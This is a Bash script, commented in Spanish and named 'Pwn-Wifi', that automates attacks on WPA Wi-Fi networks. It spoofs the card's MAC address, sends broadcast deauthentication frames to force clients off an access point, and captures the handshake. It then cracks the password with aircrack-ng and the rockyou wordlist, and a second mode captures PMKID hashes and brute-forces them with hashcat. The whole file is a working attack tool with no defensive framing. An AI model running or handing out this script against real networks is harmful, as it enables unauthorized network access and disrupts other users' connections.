#!/bin/bash

clear
echo -e "$(figlet -c Pwn-Wifi)"
sleep 1
#Colores & formatos : reverse => 033\[7m | negrita => \033[1m | cursiva => \033[3m | subrayado => \033[4m
root="\e0c1"
reset="\033[0m"
green="\033[0;32m\033[1m"
reverse="\033[7m"
red="\033[0;031m\033[1m"
yellow="\033[0;33m\033[1m"
magenta="\033[0;35m\033[1m"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT 

# #########
# Ctrl + c
# #########

function ctrl_c(){
	echo -e "\n\t${red}...Saliendo del programa...${reset}"
	tput cnorm;	airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	rm Catch* 2>/dev/null
	exit 0
}

# ##############
# Panel de Ayuda
# ##############

function help(){
	echo -e "\nPanel de ayuda del programa"
	echo -e "\t${yellow}-a <Modo de ataque>:${reset}"
	echo -e "\t\tHandshake"
	echo -e "\t\tPKMID"
	echo -e "\t${yellow}-n <Tarjeta de red>:${reset}"
	echo -e "\t${yellow}-h Panel de ayuda${reset}"
	echo -e "\t\texample -n ws03n"
	exit 0
}

# ####################
# programas necesarios
# ####################

function dependencies(){
	tput civis
	clear; dependencies=(aircrack-ng macchanger)
	echo "Programas necesarios..."
	sleep 2
	
	for program in "${dependencies[@]}"; do
	echo -ne "\n${yellow}[*] Comprobando librerias necesarias...${reset}"

	test -f /usr/bin/$program
		if [ "$(echo $?)" == "0" ]; then
			echo -e "${green}[+]${reset}"
		else
			echo -e "${red}[x]${reset}\n"
			echo -e "${yellow}Instalando complemento${reset} $program"
			pacman -Sy install $program -y > /dev/null 2>&1
		fi; sleep 2
echo $program
sleep 1
done
	

}

# ###############
# function Attack
# ###############

function startAttack(){
	clear
	echo -e "${green}[*]Configurando tarjeta de red en modo monitor...${reset}"
	airmon-ng start ${networkCard} > /dev/null 2>&1 ; sleep 2	
	ip link set dev ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
	ip link set dev ${networkCard}mon up; pkill dhclient && pkill wpa_supplicant > 2 /dev/null

	if [ "$(echo $attackMode)" == "Handshake" ]; then
		echo -e "\n\t${green}[*] Comenzando ataque...(attackMode=$attackMode || networkCard=$networkCard)${reset}"
		clear
	
		#echo -e "${green}\n[*]Configurando tarjeta de red en modo monitor...${reset}"
      		#airmon-ng start ${networkCard} > /dev/null 2>&1 ; sleep 2
		#ip link set dev ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
		#ip link set dev ${networkCard}mon up; pkill dhclient && pkill wpa_supplicant > 2 /dev/null
	
		echo -e "$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f 3-100)"
		sleep 1

		xterm -hold -e "airodump-ng ${networkCard}mon" &
		airodump_xterm_PID=$! # captura el PID (ps) de la linea de arriba

		echo -ne "${magenta} Nombre del Access Point (ESSID): ${reset}" && read APname
		echo -ne "${magenta} Canal del Access Point (ESSID): ${reset}" && read APchannel
		sleep 1	
		
		kill -9	$airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $APchannel -w Captura --essid $APname ${networkCard}mon" &
		airodump_xterm_filter_PID=$!
		sleep 5
	
		xterm -hold -e "aireplay-ng -0 10 -e $APname -c FF:FF:FF:FF:FF:FF ${networkCard}mon" & # -c MACaddress deauth.
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
	
		sleep 35; kill -9 $airodump_xterm_filter_PID; wait $airodump_xterm_filter_PID 2>/dev/null
	
		xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &

	elif [ "$(echo $attackMode)" == "PKMID" ]; then
		clear
		echo -e "${green} [+] Iniciando modo PKMID...${reset}\n"
		sleep 2
		echo -e "${magenta} Deteniendo NetworkManager.service & wpa.supplicant.service ${reset}"
		sleep 1		
		#systemctl stop wpa_supplicant.service && systemctl stop NetworkManager.service 2>/dev/null

		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon -w Captura -c 6a --essidlist=BGH"# -c 6a channel 6 freq a 2.4G
		echo -e "${green}[*]Obteniendo hashes...${reset}"
		sleep 1
		hcxpcapngtool --all  Captura #; rm Captura 2>/dev/null
		
		test -f myHashes
		if [ "$(echo $!)" == "0" ]; then
			echo -e "${green}[!] Iniciando brute force attack...[!]${reset}"
			sleep 1
			hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
		fi
	else
		echo -e "\n${red}[!] Modo de ataque NO valido [!]"
	fi
}	

# ##################
# Funcion principal
# ##################

if [ "$(id -u)" == "0" ]; then
	echo -e "\t\t${red}[*] You are root [*]${reset}"
	sleep 1
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attackMode=$OPTARG; let parameter_counter+=1 ;;
			n) networkCard=$OPTARG; let parameter_counter+=1 ;;
			h) help;;
		esac
	done
	if [ $parameter_counter != 2 ]; then
		help
	else
		dependencies
		startAttack
		tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
		#rm Catch* 2>/dev/null
	fi


else
	echo -e "${yellow}\t\t[*] You are not Root [*]${reset}"
fi

"$@" 2>/dev/null
